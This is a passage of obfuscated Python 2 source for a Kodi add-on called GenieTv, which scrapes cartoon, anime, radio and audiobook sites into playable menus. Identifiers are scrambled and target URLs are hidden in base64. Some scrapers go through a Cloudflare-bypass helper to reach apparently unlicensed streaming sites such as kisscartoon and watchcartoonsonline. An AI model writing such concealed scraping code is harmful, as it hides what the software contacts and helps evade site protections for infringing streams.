  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit via the menu." , "Your platform could not be detected so just pull the power cable." )
  if 56 - 56: OoOoOO00 / ii + i11iIiiIii + Ii11I
def O00oOooo0 ( ) :
 if xbmc . getCondVisibility ( 'system.platform.android' ) :
  return 'android'
 elif xbmc . getCondVisibility ( 'system.platform.linux' ) :
  return 'linux'
 elif xbmc . getCondVisibility ( 'system.platform.windows' ) :
  return 'windows'
 elif xbmc . getCondVisibility ( 'system.platform.osx' ) :
  return 'osx'
 elif xbmc . getCondVisibility ( 'system.platform.atv2' ) :
  return 'atv2'
 elif xbmc . getCondVisibility ( 'system.platform.ios' ) :
  return 'ios'
  if 54 - 54: OOooOooo - OOOO00ooo0Ooo - o0OOOoO0 . iIii1I11I1II1
  if 79 - 79: OOooOooo . Ooo00oOo00o
  if 40 - 40: OOooOOo + Oo . OOooOOo % OO0O
def I11I1IIiiII1 ( url ) :
 Oo0oO0ooo . create ( "[COLOR=green]GenieTv[/COLOR]" , "Renaming paths..." , '' , 'Please Wait' )
 for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( url ) :
  for file in i1iIi :
   if file . endswith ( ".xml" ) :
    Oo0oO0ooo . update ( 0 , "Fixing" , file , 'Please Wait' )
    oOoooooOoO = open ( ( os . path . join ( IIIIIii1ii11 , file ) ) ) . read ( )
    OOOooo0OooOoO = oOoooooOoO . replace ( oooOOOOO , 'special://home/' )
    Ii1II1I11i1 = open ( ( os . path . join ( IIIIIii1ii11 , file ) ) , mode = 'w' )
    Ii1II1I11i1 . write ( str ( OOOooo0OooOoO ) )
    Ii1II1I11i1 . close ( )
 o0O00oOoo ( )
 if 91 - 91: ii + OOOo0
def OoOooo ( ) :
 OOOooo = OooO0OO ( i1111 ( 'aHR0cDovL3d3dy5saXN0ZW5saXZlLmV1L3VrLmh0bWw=' ) )
 oOooOOOoOo = re . compile ( '<tr>.+?<td><a href=".+?"><b>(.+?)</b>.+?<td><a href="(.+?)">' , re . DOTALL ) . findall ( OOOooo )
 for i1I1I , iI1i11 in oOooOOOoOo :
  oo00OOoOoO00 ( i1I1I , iI1i11 , 222 , ii11iIi1I + 'radio.png' )
  if 15 - 15: i1i1i11IIi / O0 . OOooOOo . i11iIiiIii
def o0OO0O0Oo ( ) :
 OOOooo = OooO0OO ( i1111 ( 'aHR0cDovL3d3dy50b29uamV0LmNvbS8=' ) )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" style="font-size:.8em;">(.+?)</a>' ) . findall ( OOOooo )
 for iI1i11 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://www.toonjet.com/' + iI1i11 , 8051 , ii11iIi1I + 'classictoons.png' )
def OOOOO ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<a href="(.+?)"><img src="(.+?)"' ) . findall ( OOOooo )
 IiiiiI1i1Iii = re . compile ( '<a href="(.+?)">.+?</a></td></tr></table>' ) . findall ( OOOooo )
 for url , oO0O00oOOoooO in oOooOOOoOo :
  if 'ol.gif' in oO0O00oOOoooO :
   pass
  elif 'link_block_' in oO0O00oOOoooO :
   pass
  elif '.png' in oO0O00oOOoooO :
   pass
  else :
   iii1111iiI1ii ( ( oO0O00oOOoooO ) . replace ( 'http://www.toonjet.com/images/icons/' , '' ) . replace ( 'images/icons/' , '' ) . replace ( '.jpg' , '' ) . replace ( '_icon' , '' ) . replace ( '_' , ' ' ) , 'http://www.toonjet.com/' + url , 8052 , ii11iIi1I + 'vod.png' )
 for url in IiiiiI1i1Iii :
  iii1111iiI1ii ( 'NEXT PAGE' , 'http://www.toonjet.com/' + url , 8051 , ii11iIi1I + 'Next.png' )
def OOoOOo0O00O ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<iframe width="640" height="480" src="(.+?)" frameborder="0" allowfullscreen></iframe>' ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  oo00OOoOoO00 ( '[COLORgreen]PLAY[/COLOR]' , ( url ) . replace ( 'http://www.youtube.com/embed/' , '' ) . replace ( '?autoplay=0' , '' ) , 8043 , ii11iIi1I + 'classictoons.png' )
  if 36 - 36: O0 + Oo
  if 5 - 5: Oo * I1IiI
def ii1I11iIiIII1 ( ) :
 oOO0OOOOoooO ( 'Audio Books' , '' , 30011 , ii11iIi1I + 'audiobooks.png' , ii11iIi1I + 'audiobooks.png' , '' )
 oOO0OOOOoooO ( 'Kids Audio Books' , '' , 30006 , ii11iIi1I + 'kidsaudiobooks.png' , ii11iIi1I + 'kidsaudiobooks.png' , '' )
 if 22 - 22: OOOO00ooo0Ooo + iIii1I11I1II1
def IIIii1iiIi ( ) :
 oOO0OOOOoooO ( 'All' , '' , 30001 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 oOO0OOOOoooO ( 'Popular' , '' , 30012 , ii11iIi1I + 'POPULARv.png' , ii11iIi1I + 'POPULARv.png' , '' )
 oOO0OOOOoooO ( 'Search' , '' , 30013 , ii11iIi1I + 'search.png' , ii11iIi1I + 'search.png' , '' )
 if 63 - 63: ii11ii1ii
def i1II ( ) :
 OO00O0O = iii ( OO0o + 'books' + II11iiii1Ii )
 oOooOOOoOo = re . compile ( '<NAME=>(.*?)</NAME><URL=>(.*?)</URL><CAT=>(.*?)</CAT>' ) . findall ( OO00O0O )
 for i1I1I , iI1i11 , IiiI11i1I in oOooOOOoOo :
  if 'Parent' in i1I1I :
   pass
  elif '2' in IiiI11i1I :
   oOO0OOOOoooO ( ( i1I1I ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 80 - 80: Ii11I / OOOO00ooo0Ooo / I1IiI + i1IIi - Oo
def iIIiiIIi1IiI ( ) :
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oooooo0O000o = oOOoo00O00o . lower ( )
 OO00O0O = iii ( OO0o + 'books' + II11iiii1Ii )
 oOooOOOoOo = re . compile ( '<NAME=>(.*?)</NAME><URL=>(.*?)</URL><CAT=>(.*?)</CAT>' ) . findall ( OO00O0O )
 for i1I1I , iI1i11 , IiiI11i1I in oOooOOOoOo :
  if oOOoo00O00o in i1I1I . lower ( ) :
   if '1' in IiiI11i1I :
    oOO0OOOOoooO ( ( i1I1I ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   elif '2' in IiiI11i1I :
    oOO0OOOOoooO ( ( i1I1I ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   elif '3' in IiiI11i1I :
    oOO0OOOOoooO ( ( i1I1I ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 30009 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
    if 14 - 14: i1i1i11IIi % ii % Oo - i11iIiiIii
    if 53 - 53: OOooOooo % Oo
def O0ooOo0o0Oo ( ) :
 OO00O0O = iii ( OO0o + 'books' + II11iiii1Ii )
 oOooOOOoOo = re . compile ( '<NAME=>(.*?)</NAME><URL=>(.*?)</URL><CAT=>(.*?)</CAT>' ) . findall ( OO00O0O )
 for i1I1I , iI1i11 , IiiI11i1I in oOooOOOoOo :
  if '1' in IiiI11i1I :
   oOO0OOOOoooO ( ( i1I1I ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 3010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif '2' in IiiI11i1I :
   oOO0OOOOoooO ( ( i1I1I ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif '3' in IiiI11i1I :
   oOO0OOOOoooO ( ( i1I1I ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 30009 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 71 - 71: iIii1I11I1II1 - Ii11I . OOOo0 % OoooooooOO + Ii11I
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 26 - 26: Oo + Ii11I / Ooo00oOo00o % I1IiI % ii11ii1ii + OoOoOO00
def i11I1I1iiI ( url ) :
 Iii1I1111ii = url
 OO00O0O = iii ( url )
 IiiiiI1i1Iii = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( OO00O0O )
 for url , i1I1I in IiiiiI1i1Iii :
  if 'mp3' in i1I1I :
   O0Oo000ooO00 ( ( i1I1I ) . replace ( '%20' , ' ' ) , Iii1I1111ii + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  if 'wma' in i1I1I :
   O0Oo000ooO00 ( ( i1I1I ) . replace ( '%20' , ' ' ) , Iii1I1111ii + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  if 'm4b' in i1I1I :
   O0Oo000ooO00 ( ( i1I1I ) . replace ( '%20' , ' ' ) , Iii1I1111ii + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif '/' in i1I1I :
   oOO0OOOOoooO ( ( i1I1I ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , Iii1I1111ii + url , 30009 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 34 - 34: OOOO00ooo0Ooo % OO0O . O0 . iIii1I11I1II1
   if 93 - 93: i1IIi . i11iIiiIii . Oo
   if 99 - 99: OOOO00ooo0Ooo - o0OOOoO0 - ii % Ooo00oOo00o
def IiiIIiiiiii ( url ) :
 OO00O0O = iii ( url )
 Iii1I1111ii = url
 oOooOOOoOo = re . compile ( '<li><a href="(.+?)">(.+?)</a></li>' ) . findall ( OO00O0O )
 for url , i1I1I in oOooOOOoOo :
  if 'Parent' in i1I1I :
   pass
  elif '.db' in i1I1I :
   pass
  elif '.jpg' in i1I1I :
   pass
  elif '.html' in i1I1I :
   pass
  elif '.doc' in i1I1I :
   pass
  elif 'mp3' in i1I1I :
   O0Oo000ooO00 ( ( i1I1I ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , Iii1I1111ii + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif 'm4a' in i1I1I :
   O0Oo000ooO00 ( ( i1I1I ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , Iii1I1111ii + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  else :
   oOO0OOOOoooO ( ( i1I1I ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , Iii1I1111ii + url , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 100 - 100: Oo + OOooOOo - O0 % OoOoOO00 . O00oo0OO0oOOO
   if 92 - 92: OoOoOO00 * OoooooooOO - o0OOOoO0
def oooo00 ( ) :
 oOO0OOOOoooO ( 'A-Z' , '' , 7 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 oOO0OOOOoooO ( 'All' , '' , 3 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 oOO0OOOOoooO ( 'Search' , '' , 14 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 if 96 - 96: ii11ii1ii % OO0O % OOooOooo - OO0O % I1IiI + ii11ii1ii
def iI ( ) :
 OO00O0O = iii ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9tcDNfZG93bmxvYWRzLmh0bQ==' ) )
 oOooOOOoOo = re . compile ( '<td width=".+?" align="center">.+?<a href="(.*?)">.+?<img border="0" src="images/Squeeze%20(.*?).gif" width="74" height=".*?"></a></td>' , re . DOTALL ) . findall ( OO00O0O )
 for iI1i11 , oO0O00oOOoooO in oOooOOOoOo :
  print '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<' + iI1i11 + '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
  if '-x' in oO0O00oOOoooO :
   pass
  else :
   oOO0OOOOoooO ( oO0O00oOOoooO , ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) ) + ( iI1i11 ) . replace ( 'colour_it' , 'books_audio/audio_books_a' ) , 30008 , ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9pbWFnZXMvU3F1ZWV6ZSUyMA==' ) ) + oO0O00oOOoooO + '.gif' , ii11iIi1I + 'kodible.png' , '' )
   if 100 - 100: OOOo0 / OOooOOo * O00oo0OO0oOOO . O0 / Ii11I
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 83 - 83: o0OOOoO0
 if 48 - 48: OoOoOO00 * Ii11I * o0OOOoO0
def i1iiiIii11 ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<td width=".*?" height=".*?"><b>.*?<a href="(.*?)">(.*?)</a></b></td>' , re . DOTALL ) . findall ( OO00O0O )
 for url , i1I1I in oOooOOOoOo :
  if '</a>' in i1I1I :
   pass
  elif '(' in i1I1I :
   oOO0OOOOoooO ( ( i1I1I ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) + url , 30005 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  else :
   O0Oo000ooO00 ( ( i1I1I ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) + url , 30004 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 67 - 67: OOooOOo % I1IiI . I1IiI - OO0O
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 90 - 90: OO0O + OoOoOO00 * ii11ii1ii / OOooOooo . OOooOOo + OOooOOo
def I11IoOoO ( ) :
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oooooo0O000o = oOOoo00O00o . lower ( )
 OO00O0O = iii ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9jb21wbGV0ZV9saXN0Lmh0bQ==' ) )
 oOooOOOoOo = re . compile ( '<td width=".+?">.*?<b>.+?<a href="(.*?)">(.*?)</a></b></td>' , re . DOTALL ) . findall ( OO00O0O )
 for iI1i11 , i1I1I in oOooOOOoOo :
  if oOOoo00O00o in i1I1I . lower ( ) :
   if '</a>' in i1I1I :
    pass
   elif '(' in i1I1I :
    oOO0OOOOoooO ( ( i1I1I ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + iI1i11 , 30005 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   else :
    O0Oo000ooO00 ( ( i1I1I ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + iI1i11 , 30004 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
    if 26 - 26: I1IiI / Oo - i1IIi + OOOO00ooo0Ooo
    if 38 - 38: OoooooooOO / ii11ii1ii . O0 / i1IIi / Oo + iIii1I11I1II1
def ooO00O00oOO ( ) :
 OO00O0O = iii ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9jb21wbGV0ZV9saXN0Lmh0bQ==' ) )
 oOooOOOoOo = re . compile ( '<td width=".+?">.*?<b>.+?<a href="(.*?)">(.*?)</a></b></td>' , re . DOTALL ) . findall ( OO00O0O )
 for iI1i11 , i1I1I in oOooOOOoOo :
  if '</a>' in i1I1I :
   pass
  elif '(' in i1I1I :
   oOO0OOOOoooO ( ( i1I1I ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + iI1i11 , 30005 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  else :
   O0Oo000ooO00 ( ( i1I1I ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + iI1i11 , 30004 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 40 - 40: O00oo0OO0oOOO . ii + OOOo0 + ii11ii1ii + o0OOOoO0
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 26 - 26: iIii1I11I1II1
 if 87 - 87: ii11ii1ii / OoooooooOO - Oo % I1IiI % i1i1i11IIi % Oo
def Ii1 ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<a href="(.+?)">Download</a></b></td>' ) . findall ( OO00O0O )
 for url in oOooOOOoOo :
  Iii1I1111ii = ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) ) + url
  Resolve ( Iii1I1111ii )
  if 34 - 34: O00oo0OO0oOOO - OoooooooOO . OOOo0 / OoOoOO00
def II1II ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<td width="247">(.*?)</td>.*?<a href="(.+?)">' , re . DOTALL ) . findall ( OO00O0O )
 for i1I1I , url in oOooOOOoOo :
  if '<p align' in i1I1I :
   pass
  elif '&nbsp;' in i1I1I :
   pass
  else :
   O0Oo000ooO00 ( ( i1I1I ) . replace ( '&nbsp;' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 97 - 97: i11iIiiIii / Ii11I % o0OOOoO0
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 71 - 71: OoooooooOO
 if 11 - 11: i1i1i11IIi
def o0oooO ( ) :
 OO00O0O = cloudflare . source ( i1111 ( 'aHR0cDovL3dhdGNoY2FydG9vbnNvbmxpbmUuZXUv' ) )
 oOooOOOoOo = re . compile ( 'class="menu-item menu-item-type-.+?><a href="([^"]*)">(.+?)</a></li>' , re . DOTALL ) . findall ( OO00O0O )
 for iI1i11 , i1I1I in oOooOOOoOo :
  if 'ongoing' in iI1i11 :
   O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , iI1i11 , 21005 , ii11iIi1I + 'on-going.png' , '' , '' )
  if 'cartoon-series' in iI1i11 :
   O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , iI1i11 , 21005 , ii11iIi1I + 'cartoonseries.png' , '' , '' )
  if 'disney' in iI1i11 :
   O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , iI1i11 , 21005 , ii11iIi1I + 'disneytoons.png' , '' , '' )
  if 'genre' in iI1i11 :
   O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , iI1i11 , 21005 , ii11iIi1I + 'cartoongenre.png' , '' , '' )
  if 'years' in iI1i11 :
   O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , iI1i11 , 21005 , ii11iIi1I + 'years.png' , '' , '' )
def ooOo ( url ) :
 OO00O0O = cloudflare . source ( url )
 oOooOOOoOo = re . compile ( '<a href="([^"]*)" title="([^"]*)" rel="nofollow" id="featured-thumbnail">.+?<div class="featured-thumbnail"><img width="140" height="200" src="([^"]*)"' , re . DOTALL ) . findall ( OO00O0O )
 o0oO0OoO0 = re . compile ( '<button type="button"><a href="([^"]*)" target="_blank">(.+?)</a>' ) . findall ( OO00O0O )
 next = re . compile ( '<link rel="next" href="([^"]*)" />' ) . findall ( OO00O0O )
 for url , i1I1I , oO0O00oOOoooO in oOooOOOoOo :
  O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 21006 , oO0O00oOOoooO , oO0O00oOOoooO , i1I1I )
 for url , i1I1I in o0oO0OoO0 :
  O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 21005 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 for url in next :
  O0Oo000ooO00 ( '[COLORgreen]NEXT[/COLOR]' , url , 21005 , ii11iIi1I + 'Next.png' , '' , '' )
def oOOOOOoOO ( url ) :
 OO00O0O = cloudflare . source ( url )
 oOooOOOoOo = re . compile ( '<li><a href="([^"]*)" >(.+?)</a></li>' , re . DOTALL ) . findall ( OO00O0O )
 oooo00i1 = re . compile ( 'file:"([^"]*)",type:"mp4",label:"([^"]*)"' , re . DOTALL ) . findall ( OO00O0O )
 oOiI = re . compile ( 'src="([^"]*)" frameborder=' ) . findall ( OO00O0O )
 Ii1IIi = re . compile ( '<iframe src="([^"]*)"' ) . findall ( OO00O0O )
 for url , i1I1I in oOooOOOoOo :
  O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 21007 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 for url in oOiI :
  O0Oo000ooO00 ( '[COLORgreen]PLAY[/COLOR]' , 'http:' + url , 222 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 for url , i1I1I in oooo00i1 :
  O00OOOoOoo0O ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 222 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 else :
  O0Oo000ooO00 ( '[COLORgreen]NO STREAMS AVAILABLE[/COLOR]' , url , 21005 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
def i111i11I1ii ( url ) :
 OO00O0O = cloudflare . source ( url )
 oOooOOOoOo = re . compile ( 'file:"([^"]*)",type:"mp4",label:"([^"]*)"' , re . DOTALL ) . findall ( OO00O0O )
 for url , i1I1I in oOooOOOoOo :
  O00OOOoOoo0O ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 222 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
  if 64 - 64: ii / i11iIiiIii / OOooOOo . OoooooooOO
def i1iiIIi11I ( ) :
 iii1111iiI1ii ( '[COLORgreen]CARTOONS[/COLOR]' , '' , 20001 , ii11iIi1I + 'ORIGINCARTOON.png' )
 iii1111iiI1ii ( '[COLORgreen]ANIME[/COLOR]' , 'https://kissanime.to/AnimeList' , 20001 , ii11iIi1I + 'ORIGINCARTOON.png' )
 if 80 - 80: OO0O * O0
def oo000o0 ( ) :
 iii1111iiI1ii ( '[COLORgreen]BY NAME[/COLOR]' , 'http://kisscartoon.me/CartoonList' , 20002 , ii11iIi1I + 'ORIGINCARTOON.png' )
 iii1111iiI1ii ( '[COLORgreen]BY GENRE[/COLOR]' , 'http://kisscartoon.me/CartoonList' , 20003 , ii11iIi1I + 'ORIGINCARTOON.png' )
 if 25 - 25: OOOO00ooo0Ooo + I1IiI . OOooOOo % I1IiI * Ii11I
def ii1IiIi11 ( url ) :
 OO00O0O = cloudflare . source ( url )
 oOooOOOoOo = re . compile ( 'href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( OO00O0O )
 for url , i1I1I in oOooOOOoOo :
  if '?c=' in url :
   iii1111iiI1ii ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://kisscartoon.me' + url , 20004 , ii11iIi1I + 'ORIGINCARTOON.png' )
   if 22 - 22: ii
def ii1ii ( url ) :
 OO00O0O = cloudflare . source ( url )
 oOooOOOoOo = re . compile ( 'href="(.+?)" title="(.+?)">/n(.+?)</a><br/>' , re . DOTALL ) . findall ( OO00O0O )
 for url , oOoooO00O , i1I1I in oOooOOOoOo :
  if 'Genre' in url :
   iii1111iiI1ii ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://kisscartoon.me' + url , 20004 , ii11iIi1I + 'ORIGINCARTOON.png' )
   if 6 - 6: OOooOooo % i1IIi . OOooOooo * OOooOooo
def o0Oo ( url ) :
 OO00O0O = cloudflare . source ( url )
 oOooOOOoOo = re . compile ( 'src="(.+?)" style=.+?<a class="bigChar" href="(.+?)">(.+?)</a>.+?<p>(.+?)</p>' , re . DOTALL ) . findall ( OO00O0O )
 for url , oOoooO00O , i1I1I in oOooOOOoOo :
  O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://kisscartoon.me' + url , 20005 , img , '' , oOoooO00O )
  if 90 - 90: OoOoOO00 + OoooooooOO % OoooooooOO
def I11Ii ( url ) :
 OO00O0O = cloudflare . source ( url )
 oOooOOOoOo = re . compile ( '<img width="120" height="165" src="(.+?)" style=.+?<a class="bigChar" href="(.+?)">(.+?)</a>.+?<p>(.+?)</p>' , re . DOTALL ) . findall ( OO00O0O )
 for url , oOoooO00O , i1I1I in oOooOOOoOo :
  O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://kisscartoon.me' + url , 20005 , img , '' , oOoooO00O )
  if 16 - 16: Oo / i11iIiiIii
  if 64 - 64: i11iIiiIii / OOooOooo * i1IIi
  if 73 - 73: Oo - I1IiI - ii - OOOo0
  if 65 - 65: OOooOOo
  if 7 - 7: i1i1i11IIi . I1IiI / ii11ii1ii . Ii11I * OOOO00ooo0Ooo - OoOoOO00
def I1ii1iI1II11ii ( ) :
 if 8 - 8: OO0O * O0
 O0Oo000ooO00 ( '[COLORgreen]Cartoons[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5hbmltZXRvb24ub3JnL2NhcnRvb24=' ) , 10004 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Search Cartoons[/COLOR]' , '' , 10005 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 if 73 - 73: OOooOOo / ii / OOOO00ooo0Ooo / Ooo00oOo00o
def III1ii ( ) :
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oooooo0O000o = oOOoo00O00o . lower ( )
 OO00O0O = iii ( i1111 ( 'aHR0cDovL3d3dy5hbmltZXRvb24ub3JnL2NhcnRvb24=' ) )
 oOooOOOoOo = re . compile ( '<td><a href="(.+?)">(.+)</a></td>' ) . findall ( OO00O0O )
 for iI1i11 , i1I1I in oOooOOOoOo :
  if oOOoo00O00o in i1I1I . lower ( ) :
   if 'Dad!' in i1I1I :
    pass
   elif 'Family Guy' in i1I1I :
    pass
   elif '2 Stupid' in i1I1I :
    pass
   elif 'The Zelfs' in i1I1I :
    pass
   elif 'A Clone' in i1I1I :
    pass
   elif 'A.T.O.M' in i1I1I :
    pass
   elif 'Almost Naked' in i1I1I :
    pass
   elif 'Angry Kid' in i1I1I :
    pass
   elif 'Annoying Orange' in i1I1I :
    pass
   elif 'Aqua Teen' in i1I1I :
    pass
   elif 'Assy Mcgee' in i1I1I :
    pass
   elif 'Astroblast' in i1I1I :
    pass
   elif 'Atomic Betty' in i1I1I :
    pass
   elif 'Axe Cop' in i1I1I :
    pass
   elif 'Baby Playpen' in i1I1I :
    pass
   elif 'Beavis and Butt' in i1I1I :
    pass
   elif 'Celebrity Deathmatch' in i1I1I :
    pass
   elif 'Clerks The' in i1I1I :
    pass
   elif 'Crapston Villas' in i1I1I :
    pass
   elif 'Duckman:' in i1I1I :
    pass
   elif 'Stripperella' in i1I1I :
    pass
   elif 'Vixen' in i1I1I :
    pass
   else :
    O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , iI1i11 , 10006 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
  xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 41 - 41: OO0O . Oo + OOOo0
def o0O0OO ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '<td><a href="(.+?)">(.+)</a></td>' ) . findall ( OOOooo )
 for url , i1I1I in oOooOOOoOo :
  if 'Dad!' in i1I1I :
   pass
  elif 'Family Guy' in i1I1I :
   pass
  elif '2 Stupid' in i1I1I :
   pass
  elif 'The Zelfs' in i1I1I :
   pass
  elif 'A Clone' in i1I1I :
   pass
  elif 'A.T.O.M' in i1I1I :
